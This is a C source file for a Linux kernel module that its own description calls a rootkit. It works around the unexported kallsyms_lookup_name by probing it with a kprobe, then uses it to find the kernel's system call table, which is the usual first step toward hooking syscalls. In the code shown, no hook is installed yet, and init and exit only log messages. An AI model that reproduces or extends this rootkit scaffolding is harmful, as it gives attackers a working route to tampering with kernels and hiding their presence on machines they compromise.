#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/string.h>
#include <linux/unistd.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omri Ben Zikri");
MODULE_DESCRIPTION("Very fun rootkit");
MODULE_VERSION("1.0.0");

unsigned long locate_kallsyms_lookup_name(void);
unsigned long *locate_syscall_table(void);

unsigned long (*ksyms_lookup_name)(const char *name) = NULL;
unsigned long *syscall_table = NULL;

/* 
    Since kernel version 5.7.7 - kallsyms_lookup_name() is no longer exported.
    We can work around this by probing the kallsyms_lookup_name() with functions from kprobes.h
    One of the things that probing a function gives us is its memory address
*/
unsigned long locate_kallsyms_lookup_name(void)
{
    struct kprobe kp;
    unsigned long addr;

    memset(&kp, 0, sizeof(struct kprobe));
    kp.symbol_name = "kallsyms_lookup_name";

    int ret = register_kprobe(&kp);
    if (ret < 0) {
        return 0;
    }

    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

/*
    Looks up the address of the kernel syscall table.
    Returns a pointer to the table if found, otherwise returns NULL.
*/
unsigned long *locate_syscall_table(void)
{
    unsigned long addr = ksyms_lookup_name("sys_call_table");
    if (addr == 0) {
        return NULL;
    }
    return (unsigned long *)addr;
}


// LKM initialization
static int __init mod_init(void)
{
    printk(KERN_INFO "rootkit: init\n");

    // Locate 
    unsigned long kln_addr = locate_kallsyms_lookup_name();
    if (kln_addr == 0) {
        printk(KERN_ERR "Failed to locate kallsyms_lookup_name :(\n");
        return 1;
    }
    ksyms_lookup_name = (unsigned long (*)(const char *name))kln_addr;

    // Locate the syscall table
    syscall_table = locate_syscall_table();
    if (syscall_table == NULL) {
        printk(KERN_ERR "Failed to locate sys_call_table :(\n");
        return 1;
    }

    return 0;
}

// LKM cleanup
static void __exit mod_exit(void)
{
    printk(KERN_INFO "rootkit: exit\n");
}

module_init(mod_init);
module_exit(mod_exit);